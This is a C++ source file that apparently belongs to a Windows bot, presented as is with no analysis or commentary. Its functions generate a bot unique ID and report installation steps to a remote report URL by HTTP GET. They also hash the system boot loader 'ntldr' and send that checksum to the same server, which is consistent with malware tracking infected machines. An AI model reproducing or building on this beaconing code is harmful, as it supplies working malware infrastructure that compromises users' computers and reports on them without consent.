#include "BotCore.h"
#include "DbgRpt.h"

//----------------------------------------------------------------------------
#include "BotDebug.h"

namespace DBGRPTDEBGTEMPLATES
{
	#include "DbgTemplates.h"
}

#define DBGRPTDBG DBGRPTDEBGTEMPLATES::DBGOutMessage<>

void DebugReportStepByName(const char* StepName)
{
	CHAR BotUid[200];
	
	m_memset(BotUid, 0, sizeof(BotUid));

	GenerateUid(BotUid);

	PStrings Fields = Strings::Create();
	AddURLParam(Fields, "cmd", "step");
	AddURLParam(Fields, "uid", BotUid);
	AddURLParam(Fields, "step", (PCHAR)StepName);

	PCHAR Params = Strings::GetText(Fields, "&");
	PCHAR URL = STR::New(2, PP_REPORT_URL, Params);

	DBGRPTDBG("DebugReportStepByName", "go to url='%s'", URL);

	HTTP::Get(URL, NULL, NULL);

	STR::Free(URL);
	STR::Free(Params);
	Strings::Free(Fields);
}

void DbgRptSprintfA(char* buffer, const char* format, ...)
{
  va_list ptr;
  va_start(ptr, format);
  pwvsprintfA(buffer, format, ptr);
  va_end(ptr);
}

char* CalcNtldrMd5(char* Buffer, DWORD BufferSize)
{
	CHAR path[MAX_PATH];

	pGetWindowsDirectoryA(path, MAX_PATH);
	path[3] = '\0';

	m_lstrcat(path, "ntldr");

	m_memset(Buffer, 0, BufferSize);
	char* md5 = CalcFileMD5Hash(path);

	if (md5 == NULL) return NULL;
	if (BufferSize < 33) return NULL;

	for (size_t i = 0; i < 16; i++)
	{
		char ByteBuffer[10];
		DbgRptSprintfA(ByteBuffer, "%02X", (BYTE)md5[i]);
		m_lstrcat(Buffer, ByteBuffer);
	}

	return Buffer;
}

void DebugReportUpdateNtldrCheckSum()
{
	CHAR BotUid[200];
	CHAR NtldrMd5Buffer[100];
	PCHAR NtldrMd5 = NULL;

	m_memset(BotUid, 0, sizeof(BotUid));

	GenerateUid(BotUid);
	NtldrMd5 = CalcNtldrMd5(NtldrMd5Buffer, sizeof(NtldrMd5Buffer));

	PStrings Fields = Strings::Create();
	AddURLParam(Fields, "cmd", "csup");
	AddURLParam(Fields, "uid", BotUid);

	if (NtldrMd5 != NULL)
	{
		AddURLParam(Fields, "cs01", NtldrMd5);
	}

	PCHAR Params = Strings::GetText(Fields, "&");
	PCHAR URL = STR::New(2, PP_REPORT_URL, Params);

	DBGRPTDBG("DebugReportUpdateNtldrCheckSumm", "go to url='%s'", URL);
	HTTP::Get(URL, NULL, NULL);

	STR::Free(URL);
	STR::Free(Params);
	Strings::Free(Fields);
}

